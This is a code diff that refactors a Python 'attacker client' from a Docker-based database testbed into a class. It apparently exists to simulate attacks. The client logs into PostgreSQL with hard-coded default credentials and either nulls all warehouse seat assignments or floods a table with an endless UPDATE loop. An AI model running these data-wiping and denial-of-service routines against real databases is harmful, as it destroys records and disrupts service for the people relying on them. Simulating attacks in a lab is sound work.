@@ -1,32 +1,30 @@
 import psycopg2
 
-def client_program():
-    # note: use one of the following attack functions and comment out the other one
-    dosAttack()
-    eraseOccupancyInformation()
 
-def eraseOccupancyInformation():
-    # create connection to database
-    db_conn = psycopg2.connect(
-        database="postgres", user='postgres', password='docker', host='host.docker.internal', port= '5432'
-    )
-    cursor = db_conn.cursor()
-    # erase occupancy information
-    attacker_query = "UPDATE warehouse SET seat_id = NULL"
-    cursor.execute(attacker_query)
-    db_conn.commit()
+class AttackerClient:
+    def __init__(self, db_name="postgres", user="postgres", password="docker", host="postgres-db", port="5432"):
+        self.db_conn = psycopg2.connect(
+            database=db_name, user=user, password=password, host=host, port=port
+        )
+        self.cursor = self.db_conn.cursor()
 
-def dosAttack():
-    # create connection to database
-    db_conn = psycopg2.connect(
-        database="postgres", user='postgres', password='docker', host='host.docker.internal', port= '5432'
-    )
-    cursor = db_conn.cursor()
-    # continously execute an update statement
-    dos_query = "update dos_table set column1 = 'xxx'"
-    while True:
-        cursor.execute(dos_query)
-        db_conn.commit()
+    def start(self):
+        # Note: Use one of the following attack functions and comment out the other one
+        self.dos_attack()
+        # self.erase_occupancy_information()
+
+    def erase_occupancy_information(self):
+        attacker_query = "UPDATE warehouse SET seat_id = NULL"
+        self.cursor.execute(attacker_query)
+        self.db_conn.commit()
+
+    def dos_attack(self):
+        dos_query = "UPDATE dos_table SET column1 = 'xxx'"
+        while True:
+            self.cursor.execute(dos_query)
+            self.db_conn.commit()
+
 
 if __name__ == '__main__':
-    client_program()
+    attacker = AttackerClient()
+    attacker.start()
